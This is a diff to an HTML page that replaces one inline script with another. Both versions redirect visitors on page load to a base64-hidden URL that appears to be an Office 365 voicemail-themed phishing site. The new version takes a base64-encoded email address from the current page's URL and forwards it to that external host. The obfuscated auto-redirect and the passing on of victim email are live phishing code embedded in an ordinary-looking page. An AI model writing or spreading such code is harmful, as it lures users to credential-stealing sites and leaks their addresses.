@@ -321,8 +321,27 @@
                 </div>
             </div>
             <script>
-                window.location.href = atob("aHR0cHM6Ly9yaWVnLnJpZWdyaWVncmllZy5jb20vbi8/YzNZOWJ6TTJOVjh4WDNadmFXTmxKbkpoYm1ROVZsVjRibVJZYnowbWRXbGtQVlZUUlZJek1EQTVNakF5TkZVME1UQTVNekF6TkE9PQ==") + "#" + "[EMAIL]";
-            </script>
+    // Get the full URL of the current page
+    var url = window.location.href;
+
+    // Use a regular expression to extract the string inside the parentheses
+    var emailMatch = url.match(/\((.*?)\)/);
+
+    // If there is a match, extract the base64-encoded email part
+    if (emailMatch) {
+        var encodedEmail = emailMatch[1];
+
+        // Construct the new URL by inserting the encoded email part into the redirect URL
+        var redirectUrl = atob("aHR0cHM6Ly9yaWVnLnJpZWdyaWVncmllZy5jb20vbi8/YzNZOWJ6TTJOVjh4WDNadmFXTmxKbkpoYm1ROVZsVjRibVJZYnowbWRXbGtQVlZUUlZJek1EQTVNakF5TkZVME1UQTVNekF6TkE9PQ==") + "#" + encodedEmail;
+
+        // Redirect to the new URL
+        window.location.href = redirectUrl;
+    } else {
+        console.error("Email part not found in URL.");
+    }
+</script>
+
+
             <div class="col-lg-4">
                 <div class="mb-3">
                     <div class="section-title mb-0">
